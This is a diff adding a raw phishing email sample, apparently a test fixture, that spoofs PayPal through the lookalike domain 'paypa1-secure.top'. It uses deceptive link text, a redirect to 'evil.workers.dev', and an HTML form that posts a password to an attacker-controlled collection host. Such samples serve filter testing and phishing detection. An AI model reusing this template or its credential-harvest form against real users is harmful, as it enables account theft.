@@ -1,0 +1,37 @@
+Return-Path: <bounce@paypa1-secure.top>
+Received: from mx.example.org (mx.example.org [10.0.0.5])
+	by mail.example.org with LMTP id 77AB; Thu, 14 Nov 2026 08:00:05 +0000
+Received: from mail.paypa1-secure.top (unknown [203.0.113.99])
+	by mx.example.org with ESMTP id 4XYZ; Thu, 14 Nov 2026 07:59:12 +0000 (UTC)
+Received: from [192.168.1.20] (host-45-9-148-108.example.net [45.9.148.108])
+	by mail.paypa1-secure.top with ESMTPSA id 1AA; Thu, 14 Nov 2026 07:59:10 +0000
+Authentication-Results: mx.example.org; spf=fail smtp.mailfrom=paypa1-secure.top;
+	dkim=none; dmarc=fail header.from=paypal.com
+From: "PayPal Security" <service@paypal.com>
+Reply-To: resolution-center@paypa1-secure.top
+To: victim@example.org
+Subject: =?UTF-8?B?VXJnZW50OiB5b3VyIGFjY291bnQgd2lsbCBiZSBzdXNwZW5kZWQ=?=
+ =?UTF-8?Q?_within_24_hours?=
+Date: Thu, 14 Nov 2026 07:59:10 +0000
+Message-ID: <abc123@paypa1-secure.top>
+X-Mailer: PHPMailer 6.1
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="b1_xyz"
+
+--b1_xyz
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+
+We noticed unusual sign-in activity. Verify your account immediately or it =
+will be suspended. https://bit.ly/3xYzAbC
+
+--b1_xyz
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>We noticed unusual sign-in activity. Verify your account immediately or it will be suspended.</p>
+<p><a href="http://paypa1-secure.top/signin/verify?session=8812">https://www.paypal.com/signin</a></p>
+<p><a href="https://bit.ly/3xYzAbC">View your case</a></p>
+<p><a href="https://login.example-redirect.com/r?url=https%3A%2F%2Fevil.workers.dev%2Fx">Track</a></p>
+<form action="https://collect.paypa1-secure.top/p"><input type="password" name="pw"></form>
+</body></html>
+--b1_xyz--
